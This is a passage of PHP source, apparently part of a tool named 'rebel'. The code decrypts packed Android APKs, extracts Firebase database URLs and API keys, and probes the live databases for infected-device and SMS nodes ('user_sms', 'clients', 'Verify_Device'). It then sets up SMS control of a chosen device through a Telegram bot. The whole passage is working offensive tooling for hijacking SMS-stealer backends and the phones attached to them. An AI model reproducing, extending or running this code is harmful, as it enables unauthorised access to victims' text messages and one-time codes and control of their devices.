    foreach ($clients as $row) {
        if (!is_array($row)) {
            continue;
        }
        if (isset($row['client_info']['android_client_info'])) {
            $client = $row;
            break;
        }
        if (!$client) {
            $client = $row;
        }
    }

    $clientInfo = is_array($client['client_info'] ?? null) ? $client['client_info'] : [];
    $androidInfo = is_array($clientInfo['android_client_info'] ?? null) ? $clientInfo['android_client_info'] : [];

    $out['projectId'] = trim((string)($info['project_id'] ?? ''));
    $out['storageBucket'] = trim((string)($info['storage_bucket'] ?? ''));
    $out['messagingSenderId'] = trim((string)($info['project_number'] ?? ''));
    $out['appId'] = trim((string)($clientInfo['mobilesdk_app_id'] ?? ''));
    $out['packageName'] = trim((string)($androidInfo['package_name'] ?? ''));
    $out['databaseURL'] = rtrim(trim((string)($info['firebase_url'] ?? '')), '/');

    $apiKeys = is_array($client['api_key'] ?? null) ? $client['api_key'] : [];
    foreach ($apiKeys as $apiRow) {
        if (!is_array($apiRow)) {
            continue;
        }
        $key = trim((string)($apiRow['current_key'] ?? ''));
        if ($key !== '') {
            $out['apiKey'] = $key;
            break;
        }
    }

    if ($out['projectId'] !== '') {
        $out['authDomain'] = $out['projectId'] . '.firebaseapp.com';
        $out['name'] = $out['projectId'];
    }
    if ($out['packageName'] !== '') {
        $out['name'] = $out['packageName'];
    }

    return $out;
}

function rebel_apk_corpus_layers(string $raw): array
{
    $layers = [];
    if ($raw === '') {
        return $layers;
    }
    $layers[] = $raw;

    if (strlen($raw) >= 4) {
        $utf16 = @mb_convert_encoding($raw, 'UTF-8', 'UTF-16LE');
        if (is_string($utf16) && $utf16 !== '' && $utf16 !== $raw) {
            $layers[] = $utf16;
        }
        $utf16be = @mb_convert_encoding($raw, 'UTF-8', 'UTF-16BE');
        if (is_string($utf16be) && $utf16be !== '' && $utf16be !== $raw) {
            $layers[] = $utf16be;
        }
    }

    $urlDecoded = rawurldecode($raw);
    if ($urlDecoded !== $raw && $urlDecoded !== '') {
        $layers[] = $urlDecoded;
    }

    if (preg_match_all('/[A-Za-z0-9+\/]{24,420}={0,2}/', $raw, $b64Matches)) {
        foreach ($b64Matches[0] as $b64) {
            $decoded = base64_decode($b64, true);
            if ($decoded === false || $decoded === '') {
                continue;
            }
            if (preg_match('/firebase|AIza|project_id|database/i', $decoded)) {
                $layers[] = $decoded;
            }
        }
    }

    if (preg_match('/[\{\[]/', $raw)) {
        $json = json_decode($raw, true);
        if (is_array($json)) {
            $layers[] = json_encode($json, JSON_UNESCAPED_UNICODE);
        }
    }

    return array_values(array_unique($layers, SORT_STRING));
}

function rebel_apk_is_skippable_entry(string $name, int $size): bool
{
    if ($size <= 0) {
        return true;
    }
    if ($size > 8 * 1024 * 1024 && preg_match('/\.(png|jpe?g|gif|webp|mp3|mp4|wav|ttf|otf|woff2?)$/i', $name)) {
        return true;
    }
    return false;
}

function rebel_apk_is_stub_packer_asset(string $name): bool
{
    return (bool) preg_match('#^assets/[0-9a-f]{16}$#', $name);
}

function rebel_apk_stub_payload_valid(string $plain): bool
{
    if ($plain === '') {
        return false;
    }
    if (str_starts_with($plain, "PK\x03\x04") || str_starts_with($plain, "dex\n")) {
        return true;
    }
    if (stripos($plain, 'firebaseio') !== false || stripos($plain, 'firebasedatabase.app') !== false) {
        return true;
    }
    return (bool) preg_match('/AIza[A-Za-z0-9_-]{35}/', $plain);
}

function rebel_apk_decrypt_stub_payload(string $key, string $encrypted): string
{
    if (strlen($key) !== 16 || strlen($encrypted) < 32 || (strlen($encrypted) % 16) !== 0) {
        return '';
    }
    if (!function_exists('openssl_decrypt')) {
        return '';
    }

    $iv = substr($encrypted, 0, 16);
    $body = substr($encrypted, 16);
    $modes = [OPENSSL_RAW_DATA | OPENSSL_ZERO_PADDING, OPENSSL_RAW_DATA];
    foreach ($modes as $flags) {
        $plain = @openssl_decrypt($body, 'AES-128-CBC', $key, $flags, $iv);
        if (is_string($plain) && rebel_apk_stub_payload_valid($plain)) {
            return $plain;
        }
    }

    return '';
}

function rebel_apk_try_stub_unpack(ZipArchive $zip): string
{
    $keys = [];
    $payloads = [];

    for ($i = 0; $i < $zip->numFiles; $i++) {
        $name = (string) $zip->getNameIndex($i);
        if (!rebel_apk_is_stub_packer_asset($name)) {
            continue;
        }

        $raw = $zip->getFromIndex($i);
        if ($raw === false || $raw === '') {
            continue;
        }

        $len = strlen($raw);
        if ($len === 16) {
            $keys[] = $raw;
        } elseif ($len > 65536 && ($len % 16) === 0) {
            $payloads[] = $raw;
        }
    }

    if (!$keys || !$payloads) {
        return '';
    }

    foreach ($keys as $key) {
        foreach ($payloads as $encrypted) {
            $plain = rebel_apk_decrypt_stub_payload($key, $encrypted);
            if ($plain !== '') {
                return $plain;
            }
        }
    }

    return '';
}

function rebel_apk_append_scan_bytes(string &$scanBlob, int $scanBudget, string $raw): void
{
    if ($raw === '' || strlen($scanBlob) >= $scanBudget) {
        return;
    }

    foreach (rebel_apk_corpus_layers($raw) as $layer) {
        if (strlen($scanBlob) >= $scanBudget) {
            break;
        }
        $take = min(strlen($layer), $scanBudget - strlen($scanBlob));
        if ($take > 0) {
            $scanBlob .= substr($layer, 0, $take);
        }
    }
}

function rebel_apk_scan_inner_zip_bytes(string $bytes, string &$scanBlob, int $scanBudget): void
{
    if ($bytes === '' || !str_starts_with($bytes, "PK\x03\x04") || !class_exists('ZipArchive')) {
        rebel_apk_append_scan_bytes($scanBlob, $scanBudget, $bytes);
        return;
    }

    rebel_apk_append_scan_bytes($scanBlob, $scanBudget, $bytes);

    $tmp = tempnam(sys_get_temp_dir(), 'rebel_stub_');
    if ($tmp === false) {
        return;
    }

    if (file_put_contents($tmp, $bytes) === false) {
        @unlink($tmp);
        return;
    }

    $inner = new ZipArchive();
    if ($inner->open($tmp) === true) {
        for ($i = 0; $i < $inner->numFiles; $i++) {
            if (strlen($scanBlob) >= $scanBudget) {
                break;
            }

            $name = (string) $inner->getNameIndex($i);
            if ($name === '') {
                continue;
            }

            $stat = $inner->statIndex($i);
            $size = is_array($stat) ? (int)($stat['size'] ?? 0) : 0;
            if (rebel_apk_is_skippable_entry($name, $size)) {
                continue;
            }

            $raw = $inner->getFromIndex($i);
            if ($raw === false || $raw === '') {
                continue;
            }

            if (strlen($raw) > 4 * 1024 * 1024) {
                $raw = substr($raw, 0, 4 * 1024 * 1024);
            }

            rebel_apk_append_scan_bytes($scanBlob, $scanBudget, $raw);
        }
        $inner->close();
    }

    @unlink($tmp);
}

function rebel_apk_device_path_catalog(): array
{
    return [
        'clients',
        'devices',
        'devices_status',
        'Verify_Device',
        'user_list',
        'user_data',
        'user_sms',
        'users',
        'All_Users',
        'All_User',
        'online_devices',
        'clients_list',
        'online_status',
        'device_list',
        'devices_list',
        'Verify_Device',
    ];
}

function rebel_apk_collect_device_paths(string $blob): array
{
    $found = [];
    $boundary = "[\x00/\"']";
    foreach (rebel_apk_device_path_catalog() as $path) {
        $quoted = preg_quote($path, '/');
        $pattern = "/(?:^|{$boundary})({$quoted})(?:{$boundary}|\$)/i";
        if (preg_match($pattern, $blob)) {
            $found[] = $path;
        }
    }
    if (preg_match_all('/Verify_[A-Za-z0-9_]+/', $blob, $m)) {
        foreach ($m[0] as $path) {
            if (!in_array($path, $found, true)) {
                $found[] = $path;
            }
        }
    }
    return array_values(array_unique($found));
}

function rebel_apk_http_get(string $url, int $timeout = 8): array
{
    $headers = ['Accept: application/json'];
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => $timeout,
            CURLOPT_HTTPHEADER => $headers,
            CURLOPT_FOLLOWLOCATION => true,
        ]);
        $body = curl_exec($ch);
        $code = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        return [
            'code' => $code,
            'body' => is_string($body) ? $body : '',
        ];
    }

    $ctx = stream_context_create([
        'http' => [
            'method' => 'GET',
            'timeout' => $timeout,
            'header' => implode("\r\n", $headers) . "\r\n",
            'ignore_errors' => true,
        ],
    ]);
    $body = @file_get_contents($url, false, $ctx);
    global $http_response_header;
    $code = 0;
    if (!empty($http_response_header[0]) && preg_match('/\s(\d{3})\s/', $http_response_header[0], $m)) {
        $code = (int) $m[1];
    }

    return [
        'code' => $code,
        'body' => is_string($body) ? $body : '',
    ];
}

function rebel_apk_probe_database_url(string $url, string $apiKey = ''): int
{
    $url = rtrim(trim($url), '/');
    if ($url === '') {
        return -1;
    }

    $auths = array_values(array_unique(array_filter([$apiKey, $url], static fn($v) => $v !== '')));
    $auths[] = '';

    $best = -1;
    foreach ($auths as $auth) {
        $probe = $url . '/.json?shallow=true';
        if ($auth !== '') {
            $probe .= '&auth=' . rawurlencode($auth);
        }
        $resp = rebel_apk_http_get($probe, 6);
        $code = (int) ($resp['code'] ?? 0);
        $body = strtolower((string) ($resp['body'] ?? ''));

        if ($code === 0) {
            continue;
        }
        if ($code === 423 || str_contains($body, 'deactivated')) {
            $best = max($best, 0);
            continue;
        }
        if ($code === 200 && !str_contains($body, 'permission denied')) {
            return 100;
        }
        if ($code === 401 || $code === 403 || str_contains($body, 'permission denied')) {
            $best = max($best, 35);
            continue;
        }
        if (in_array($code, [200, 401, 403], true)) {
            $best = max($best, 20);
        }
    }

    return $best;
}

function rebel_apk_pick_live_database_url(array $urls, string $apiKey = '', string $blob = ''): string
{
    $best = '';
    $bestScore = -1;
    foreach ($urls as $url) {
        $url = rtrim(trim((string) $url), '/');
        if ($url === '') {
            continue;
        }
        $score = rebel_apk_probe_database_url($url, $apiKey);
        if ($blob !== '') {
            $score += rebel_apk_score_firebase_url($url, $blob);
        }
        if ($score > $bestScore) {
            $bestScore = $score;
            $best = $url;
        }
    }

    return $best;
}

function rebel_apk_guess_urls_from_package(string $package): array
{
    $package = strtolower(trim($package));
    if ($package === '') {
        return [];
    }

    $urls = [];
    $parts = array_values(array_filter(explode('.', $package)));
    $leaf = $parts ? $parts[count($parts) - 1] : '';
    $prefix = $parts ? $parts[0] : '';

    if (str_contains($package, 'shootadmin') || str_contains($package, 'shootii')) {
        $urls[] = 'https://shoot-admin-default-rtdb.firebaseio.com';
        $urls[] = 'https://shootadmin-default-rtdb.firebaseio.com';
    }
    if ($leaf !== '' && $leaf !== 'app' && $leaf !== 'admin') {
        $urls[] = 'https://' . $leaf . '-default-rtdb.firebaseio.com';
    }
    if ($prefix !== '' && $leaf !== '' && $prefix !== $leaf) {
        $urls[] = 'https://' . $prefix . '-' . $leaf . '-default-rtdb.firebaseio.com';
    }

    return array_values(array_unique($urls));
}

function rebel_apk_detect_live_device_node(string $url, string $apiKey, array $candidates): string
{
    $url = rtrim(trim($url), '/');
    if ($url === '') {
        return '';
    }

    $auths = array_values(array_unique(array_filter([$apiKey, $url], static fn($v) => $v !== '')));
    $bestPath = '';
    $bestCount = -1;

    foreach ($candidates as $path) {
        $path = trim((string) $path);
        if ($path === '') {
            continue;
        }
        foreach ($auths as $auth) {
            $probe = $url . '/' . ltrim($path, '/') . '.json?auth=' . rawurlencode($auth);
            $resp = rebel_apk_http_get($probe, 8);
            if ((int) ($resp['code'] ?? 0) !== 200) {
                continue;
            }
            $parsed = json_decode((string) ($resp['body'] ?? ''), true);
            if (!is_array($parsed) || $parsed === []) {
                continue;
            }
            $count = count($parsed);
            if ($count > $bestCount) {
                $bestCount = $count;
                $bestPath = $path;
            }
            break;
        }
    }

    return $bestPath;
}

function rebel_apk_try_scan_nested_apks(ZipArchive $zip, string &$scanBlob, int $scanBudget, array &$sources): void
{
    for ($i = 0; $i < $zip->numFiles; $i++) {
        $name = (string) $zip->getNameIndex($i);
        if ($name === '' || !preg_match('#^assets/.+\.apk$#i', $name)) {
            continue;
        }

        $raw = $zip->getFromIndex($i);
        if ($raw === false || $raw === '' || !str_starts_with($raw, "PK\x03\x04")) {
            continue;
        }

        rebel_apk_scan_inner_zip_bytes($raw, $scanBlob, $scanBudget);
        $sources[] = 'nested_apk';
    }
}

function rebel_apk_try_scan_loose_assets(ZipArchive $zip, string &$scanBlob, int $scanBudget, array &$sources): void
{
    for ($i = 0; $i < $zip->numFiles; $i++) {
        $name = (string) $zip->getNameIndex($i);
        if ($name === '' || stripos($name, 'assets/') !== 0) {
            continue;
        }
        if (rebel_apk_is_stub_packer_asset($name)) {
            continue;
        }

        $stat = $zip->statIndex($i);
        $size = is_array($stat) ? (int)($stat['size'] ?? 0) : 0;
        if ($size <= 0 || $size > 16 * 1024 * 1024) {
            continue;
        }

        $raw = $zip->getFromIndex($i);
        if ($raw === false || $raw === '') {
            continue;
        }

        if (str_starts_with($raw, "PK\x03\x04") || str_starts_with($raw, "dex\n")) {
            rebel_apk_scan_inner_zip_bytes($raw, $scanBlob, $scanBudget);
            $sources[] = 'asset_blob';
            continue;
        }

        if (preg_match('/firebaseio|firebasedatabase|AIzaSy/i', $raw)) {
            rebel_apk_append_scan_bytes($scanBlob, $scanBudget, $raw);
            $sources[] = 'asset_scan';
        }
    }
}

function rebel_apk_finalize_extract(array $out, string $scanBlob, array $sources): array
{
    if ($sources) {
        $out['source'] = implode('+', array_values(array_unique($sources)));
    }

    $allUrls = [];
    if ($out['databaseURL'] !== '') {
        $allUrls[] = rtrim($out['databaseURL'], '/');
    }
    foreach ($out['altDatabaseURLs'] ?? [] as $url) {
        if ($url !== '') {
            $allUrls[] = rtrim((string) $url, '/');
        }
    }
    if ($scanBlob !== '') {
        foreach (rebel_apk_collect_firebase_urls($scanBlob) as $url) {
            $allUrls[] = rtrim($url, '/');
        }
    }
    if ($out['packageName'] ?? '') {
        $allUrls = array_merge($allUrls, rebel_apk_guess_urls_from_package((string) $out['packageName']));
    }
    $allUrls = array_values(array_unique($allUrls));

    if ($allUrls) {
        $live = rebel_apk_pick_live_database_url($allUrls, (string) ($out['apiKey'] ?? ''), $scanBlob);
        if ($live !== '') {
            if ($out['databaseURL'] !== '' && rtrim($out['databaseURL'], '/') !== $live) {
                $out['altDatabaseURLs'] = array_values(array_unique(array_merge(
                    [$out['databaseURL']],
                    $out['altDatabaseURLs'] ?? []
                )));
            }
            $out['databaseURL'] = $live;
            if (str_contains((string) ($out['source'] ?? ''), 'live_probe') === false) {
                $out['source'] = ($out['source'] !== '' ? $out['source'] . '+' : '') . 'live_probe';
            }
        }
    }

    if ($out['databaseURL'] === '') {
        $probeIds = [];
        if ($out['projectId'] !== '') {
            $probeIds[] = $out['projectId'];
        }
        foreach ($out['altProjectIds'] ?? [] as $pid) {
            if ($pid !== '') {
                $probeIds[] = $pid;
            }
        }
        $candidates = [];
        foreach (array_values(array_unique($probeIds)) as $pid) {
            $candidates = array_merge($candidates, rebel_apk_guess_database_urls($pid));
        }
        if ($out['packageName'] ?? '') {
            $candidates = array_merge($candidates, rebel_apk_guess_urls_from_package((string) $out['packageName']));
        }
        $candidates = array_values(array_unique($candidates));
        $live = rebel_apk_pick_live_database_url($candidates, (string) ($out['apiKey'] ?? ''), $scanBlob);
        if ($live !== '') {
            $out['databaseURL'] = $live;
            $out['source'] = ($out['source'] !== '' ? $out['source'] . '+' : '') . 'project_id_probe';
        } elseif ($candidates) {
            $out['databaseURL'] = $candidates[0];
            $out['source'] = ($out['source'] !== '' ? $out['source'] . '+' : '') . 'project_id_guess';
        }
    }

    if ($out['databaseURL'] === '') {
        return ['ok' => false, 'error' => 'Firebase config not found in APK — try another build'];
    }

    $devicePaths = $scanBlob !== '' ? rebel_apk_collect_device_paths($scanBlob) : [];
    if (!$devicePaths) {
        $devicePaths = ['clients', 'devices', 'Verify_Device', 'user_list'];
    }
    $out['deviceNodes'] = $devicePaths;
    $liveNode = rebel_apk_detect_live_device_node(
        (string) $out['databaseURL'],
        (string) ($out['apiKey'] ?? ''),
        $devicePaths
    );
    $out['preferredDeviceNode'] = $liveNode !== '' ? $liveNode : ($devicePaths[0] ?? 'clients');
    $out['schema'] = rebel_apk_detect_schema($out['databaseURL'], $scanBlob);
    $out['ok'] = true;

    return $out;
}

function rebel_apk_collect_api_keys(string $blob): array
{
    $keys = [];
    $patterns = [
        '/AIza[A-Za-z0-9_-]{35}/',
        '/"current_key"\s*:\s*"(AIza[^"]+)"/',
        '/"api_key"\s*:\s*"(AIza[^"]+)"/',
        '/"apiKey"\s*:\s*"(AIza[^"]+)"/',
        '/google_api_key[^"\']*["\'](AIza[^"\']+)["\']/i',
        '/firebase_api_key[^"\']*["\'](AIza[^"\']+)["\']/i',
    ];
    foreach ($patterns as $pattern) {
        if (!preg_match_all($pattern, $blob, $matches)) {
            continue;
        }
        $found = $matches[1] ?? $matches[0];
        foreach ($found as $key) {
            $key = trim((string) $key);
            if ($key !== '' && !in_array($key, $keys, true)) {
                $keys[] = $key;
            }
        }
    }
    return $keys;
}

function rebel_apk_pick_best_api_key(array $keys, string $blob, string $databaseUrl = ''): string
{
    $best = '';
    $bestScore = -1;
    foreach ($keys as $key) {
        if (!str_starts_with($key, 'AIza')) {
            continue;
        }
        $score = 10;
        $pos = strpos($blob, $key);
        if ($pos !== false) {
            $score += 5;
            if ($databaseUrl !== '') {
                $urlPos = stripos($blob, $databaseUrl);
                if ($urlPos !== false && abs($urlPos - $pos) < 800) {
                    $score += 40;
                }
            }
        }
        $score += min(20, substr_count($blob, $key) * 4);
        if ($score > $bestScore) {
            $bestScore = $score;
            $best = $key;
        }
    }
    return $best;
}

function rebel_apk_push_url(array &$urls, string $url): void
{
    $url = rtrim(trim($url), '/');
    if ($url === '' || !preg_match('#^https://#i', $url)) {
        return;
    }
    if (!preg_match('#\.(?:firebaseio\.com|firebasedatabase\.app)(?:/|$)#i', $url)) {
        return;
    }
    if (!in_array($url, $urls, true)) {
        $urls[] = $url;
    }
}

function rebel_apk_collect_firebase_urls(string $blob): array
{
    $urls = [];

    if (preg_match_all(
        "#https?://[a-z0-9_-]+(?:-default-rtdb)?(?:\\.[a-z0-9-]+)?\\.(?:firebaseio\\.com|firebasedatabase\\.app)[^\\s\\x00\"']*#i",
        $blob,
        $matches
    )) {
        foreach ($matches[0] as $url) {
            rebel_apk_push_url($urls, preg_replace('#/(clients|devices|messages|all_sms|new_sms)(/.*)?$#i', '', (string) $url));
        }
    }

    if (preg_match_all(
        "#(?:firebase_database_url|databaseURL|database_url)[\\x00-\\xFF]{0,40}(https?://[^\\s\\x00\"']+)#i",
        $blob,
        $matches
    )) {
        foreach ($matches[1] as $url) {
            rebel_apk_push_url($urls, (string) $url);
        }
    }

    if (preg_match_all(
        "#https?%3A%2F%2F[a-z0-9_-]+(?:-default-rtdb)?(?:\\.[a-z0-9-]+)?\\.(?:firebaseio\\.com|firebasedatabase\\.app)[^\\s\\x00\"']*#i",
        $blob,
        $matches
    )) {
        foreach ($matches[0] as $enc) {
            rebel_apk_push_url($urls, rawurldecode((string) $enc));
        }
    }

    if (preg_match_all(
        '#([a-z0-9_-]{3,80})(?:-default-rtdb)?\.firebaseio\.com#i',
        $blob,
        $matches
    )) {
        foreach ($matches[0] as $host) {
            rebel_apk_push_url($urls, 'https://' . rtrim((string) $host, '/'));
        }
    }

    if (preg_match_all(
        '#([a-z0-9_-]{3,80}-default-rtdb\.[a-z0-9-]+\.firebasedatabase\.app)#i',
        $blob,
        $matches
    )) {
        foreach ($matches[0] as $host) {
            rebel_apk_push_url($urls, 'https://' . rtrim((string) $host, '/'));
        }
    }

    return $urls;
}

function rebel_apk_score_firebase_url(string $url, string $blob): int
{
    $score = 0;
    $base = rtrim($url, '/');
    if (stripos($blob, $base . '/clients') !== false) {
        $score += 50;
    }
    if (stripos($blob, $base . '/devices') !== false) {
        $score += 40;
    }
    if (stripos($blob, $base . '/messages') !== false) {
        $score += 30;
    }
    if (str_contains($url, 'firebaseio.com')) {
        $score += 10;
    }
    if (rebel_firebase_url_likely_valid($base)) {
        $score += 25;
    }
    return $score;
}

function rebel_apk_pick_best_url(array $urls, string $blob): string
{
    $best = '';
    $bestScore = -1;
    foreach ($urls as $url) {
        $score = rebel_apk_score_firebase_url($url, $blob);
        if ($score > $bestScore) {
            $bestScore = $score;
            $best = $url;
        }
    }
    return $best;
}

function rebel_apk_project_id_from_url(string $url): string
{
    if (preg_match('#https://([a-z0-9_-]+)(?:-default-rtdb)?\.#i', $url, $m)) {
        return trim($m[1]);
    }
    return '';
}

function rebel_apk_detect_schema(string $url, string $blob): string
{
    $base = rtrim($url, '/');
    $urlLower = strtolower($url);
    if (str_contains($urlLower, 'rabel') || str_contains($urlLower, 'raand')) {
        return 'rabel';
    }
    if (stripos($blob, $base . '/clients') !== false || stripos($blob, $base . '/messages') !== false) {
        return 'rabel';
    }
    if (stripos($blob, $base . '/devices') !== false) {
        return 'spinplay';
    }
    $roots = rebel_firebase_req('GET', $url, '', '');
    if (is_array($roots)) {
        if (array_key_exists('messages', $roots) || array_key_exists('clients', $roots)) {
            return 'rabel';
        }
        if (array_key_exists('devices', $roots) || array_key_exists('devices_status', $roots)) {
            return 'spinplay';
        }
    }
    return 'spinplay';
}

function rebel_apk_deep_scan(string $blob, array $out): array
{
    $allUrls = [];
    $allKeys = [];
    $projectIds = [];

    foreach (rebel_apk_corpus_layers($blob) as $layer) {
        foreach (rebel_apk_collect_firebase_urls($layer) as $url) {
            if (!in_array($url, $allUrls, true)) {
                $allUrls[] = $url;
            }
        }
        foreach (rebel_apk_collect_api_keys($layer) as $key) {
            if (!in_array($key, $allKeys, true)) {
                $allKeys[] = $key;
            }
        }
        if (preg_match_all('/"project_id"\s*:\s*"([^"]+)"/', $layer, $m)) {
            foreach ($m[1] as $pid) {
                $pid = trim((string) $pid);
                if ($pid !== '' && !in_array($pid, $projectIds, true)) {
                    $projectIds[] = $pid;
                }
            }
        }
    }

    if ($out['databaseURL'] === '' && $allUrls) {
        $out['databaseURL'] = rebel_apk_pick_live_database_url($allUrls, (string) ($out['apiKey'] ?? ''), $blob);
        if ($out['databaseURL'] === '') {
            $out['databaseURL'] = rebel_apk_pick_best_url($allUrls, $blob);
        }
    } elseif ($out['databaseURL'] !== '' && count($allUrls) > 1) {
        $live = rebel_apk_pick_live_database_url($allUrls, (string) ($out['apiKey'] ?? ''), $blob);
        if ($live !== '') {
            $out['databaseURL'] = $live;
        }
    } elseif ($out['databaseURL'] !== '' && !in_array($out['databaseURL'], $allUrls, true)) {
        $allUrls[] = $out['databaseURL'];
    }

    if ($out['apiKey'] === '' && $allKeys) {
        $out['apiKey'] = rebel_apk_pick_best_api_key($allKeys, $blob, $out['databaseURL']);
    } elseif ($out['apiKey'] !== '' && !in_array($out['apiKey'], $allKeys, true)) {
        $allKeys[] = $out['apiKey'];
    }

    if ($out['projectId'] === '' && $projectIds) {
        $out['projectId'] = $projectIds[0];
    }
    if ($out['projectId'] === '' && $out['databaseURL'] !== '') {
        $out['projectId'] = rebel_apk_project_id_from_url($out['databaseURL']);
    }
    if ($out['projectId'] !== '') {
        if ($out['authDomain'] === '') {
            $out['authDomain'] = $out['projectId'] . '.firebaseapp.com';
        }
        if ($out['name'] === '') {
            $out['name'] = $out['projectId'];
        }
    }

    if ($allKeys) {
        $out['apiKeysFound'] = $allKeys;
    }
    if (count($allUrls) > 1) {
        $out['altDatabaseURLs'] = array_values(array_filter(
            $allUrls,
            static fn($u) => rtrim($u, '/') !== rtrim((string)($out['databaseURL'] ?? ''), '/')
        ));
    }
    if (count($projectIds) > 1) {
        $out['altProjectIds'] = array_values(array_filter(
            $projectIds,
            static fn($p) => $p !== ($out['projectId'] ?? '')
        ));
    }

    return $out;
}

function rebel_apk_scan_blob(string $blob, array $out): array
{
    return rebel_apk_deep_scan($blob, $out);
}

function rebel_apk_extract_from_zip_path(string $path): array
{
    if (!class_exists('ZipArchive')) {
        return ['ok' => false, 'error' => 'ZipArchive PHP extension required for APK upload'];
    }

    $zip = new ZipArchive();
    if ($zip->open($path) !== true) {
        return ['ok' => false, 'error' => 'Invalid APK or ZIP file'];
    }

    $out = [
        'databaseURL' => '',
        'apiKey' => '',
        'projectId' => '',
        'appId' => '',
        'packageName' => '',
        'storageBucket' => '',
        'messagingSenderId' => '',
        'authDomain' => '',
        'name' => '',
        'schema' => 'spinplay',
        'source' => '',
    ];
    $scanBlob = '';
    $scanBudget = 28 * 1024 * 1024;
    $sources = [];

    $stubPlain = rebel_apk_try_stub_unpack($zip);
    if ($stubPlain !== '') {
        rebel_apk_scan_inner_zip_bytes($stubPlain, $scanBlob, $scanBudget);
        $sources[] = 'stub_decrypt';
    }

    rebel_apk_try_scan_nested_apks($zip, $scanBlob, $scanBudget, $sources);

    for ($i = 0; $i < $zip->numFiles; $i++) {
        $name = (string) $zip->getNameIndex($i);
        if ($name === '') {
            continue;
        }

        $stat = $zip->statIndex($i);
        $size = is_array($stat) ? (int)($stat['size'] ?? 0) : 0;
        if (rebel_apk_is_skippable_entry($name, $size) || rebel_apk_is_stub_packer_asset($name)) {
            continue;
        }

        if (stripos($name, 'google-services.json') !== false) {
            $raw = $zip->getFromIndex($i);
            if ($raw !== false) {
                $parsed = json_decode($raw, true);
                if (is_array($parsed)) {
                    $out = array_merge($out, rebel_apk_parse_google_services($parsed));
                    $sources[] = 'google-services.json';
                } else {
                    $scanBlob .= $raw;
                }
            }
            continue;
        }

        $raw = $zip->getFromIndex($i);
        if ($raw === false || $raw === '') {
            continue;
        }

        if (strlen($raw) > 4 * 1024 * 1024) {
            $raw = substr($raw, 0, 4 * 1024 * 1024);
        }

        foreach (rebel_apk_corpus_layers($raw) as $layer) {
            if (strlen($scanBlob) >= $scanBudget) {
                break 2;
            }
            $take = min(strlen($layer), $scanBudget - strlen($scanBlob));
            if ($take > 0) {
                $scanBlob .= substr($layer, 0, $take);
            }
        }
    }

    rebel_apk_try_scan_loose_assets($zip, $scanBlob, $scanBudget, $sources);
    $zip->close();

    if ($scanBlob !== '') {
        $out = rebel_apk_deep_scan($scanBlob, $out);
        if ($out['databaseURL'] !== '' || $out['apiKey'] !== '') {
            $sources[] = 'deep_scan';
        }
        if ($out['packageName'] === '' && preg_match('/package[\x00=:]+\x00?([a-z0-9_.]+)/i', $scanBlob, $pm)) {
            $out['packageName'] = trim($pm[1]);
        }
    }

    return rebel_apk_finalize_extract($out, $scanBlob, $sources);
}

function rebel_apk_extract_from_bytes(string $bytes): array
{
    if ($bytes === '') {
        return ['ok' => false, 'error' => 'Empty file'];
    }
    $tmp = tempnam(sys_get_temp_dir(), 'rebel_apk_');
    if ($tmp === false) {
        return ['ok' => false, 'error' => 'Temp file error'];
    }
    if (file_put_contents($tmp, $bytes) === false) {
        @unlink($tmp);
        return ['ok' => false, 'error' => 'Could not write temp file'];
    }
    $result = rebel_apk_extract_from_zip_path($tmp);
    @unlink($tmp);
    return $result;
}

function rebel_apk_extract_api_handle(): void
{
    if (empty($_FILES['apk']) || !is_uploaded_file($_FILES['apk']['tmp_name'])) {
        rebel_json_out(['ok' => false, 'error' => 'Upload an APK file (field: apk)'], 400);
    }

    $file = $_FILES['apk'];
    $name = strtolower((string)($file['name'] ?? ''));
    if (!str_ends_with($name, '.apk') && !str_ends_with($name, '.zip')) {
        rebel_json_out(['ok' => false, 'error' => 'File must be .apk or .zip'], 400);
    }

    $size = (int)($file['size'] ?? 0);
    if ($size <= 0) {
        rebel_json_out(['ok' => false, 'error' => 'Empty upload'], 400);
    }
    if ($size > 120 * 1024 * 1024) {
        rebel_json_out(['ok' => false, 'error' => 'APK too large (max 120MB)'], 400);
    }

    $bytes = file_get_contents($file['tmp_name']);
    if ($bytes === false) {
        rebel_json_out(['ok' => false, 'error' => 'Could not read upload'], 500);
    }

    $result = rebel_apk_extract_from_bytes($bytes);
    rebel_json_out($result, !empty($result['ok']) ? 200 : 422);
}

function rebel_sms_token_file(): string
{
    return __DIR__ . '/rebel_sms_token.json';
}

function rebel_sms_token_defaults(): array
{
    return [
        'enabled' => false,
        'device_id' => '',
        'database_url' => '',
        'fb_name' => '',
        'auth_key' => '',
        'schema' => 'rabel',
        'device_node' => 'clients',
        'sim' => 1,
        'bot_token' => '',
        'channel_id' => '',
        'owner_id' => '',
        'log' => [],
    ];
}

function rebel_sms_token_load(): array
{
    $file = rebel_sms_token_file();
    $defaults = rebel_sms_token_defaults();
    if (!is_file($file)) {
        return $defaults;
    }
    $raw = file_get_contents($file);
    if ($raw === false || trim($raw) === '') {
        return $defaults;
    }
    $data = json_decode($raw, true);
    if (!is_array($data)) {
        return $defaults;
    }
    if (!isset($data['log']) || !is_array($data['log'])) {
        $data['log'] = [];
    }
    return array_merge($defaults, $data);
}

function rebel_sms_token_save(array $config): void
{
    file_put_contents(
        rebel_sms_token_file(),
        json_encode($config, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE),
        LOCK_EX
    );
}

function rebel_sms_token_public_config(array $config): array
{
    $botToken = trim((string)($config['bot_token'] ?? ''));
    $mask = '';
    if ($botToken !== '') {
        $mask = strlen($botToken) > 12
            ? substr($botToken, 0, 8) . '…' . substr($botToken, -4)
            : '••••••••';
    }
    return [
        'enabled' => !empty($config['enabled']),
        'device_id' => (string)($config['device_id'] ?? ''),
        'database_url' => (string)($config['database_url'] ?? ''),
        'fb_name' => (string)($config['fb_name'] ?? ''),
        'schema' => (string)($config['schema'] ?? 'rabel'),
        'device_node' => (string)($config['device_node'] ?? 'clients'),
        'sim' => max(1, (int)($config['sim'] ?? 1)),
        'bot_token' => $botToken,
        'bot_token_mask' => $mask,
        'has_bot_token' => $botToken !== '',
        'channel_id' => (string)($config['channel_id'] ?? ''),
        'owner_id' => (string)($config['owner_id'] ?? ''),
        'updated' => (int)($config['updated'] ?? 0),
    ];
}

function rebel_sms_token_channel_allowed(string $chatId): bool
{
    $cfg = rebel_sms_token_load();
    $want = trim((string)($cfg['channel_id'] ?? ''));
    if ($want === '') {
        return true;
    }
    $chatId = trim($chatId);
    if ($chatId === $want) {
        return true;
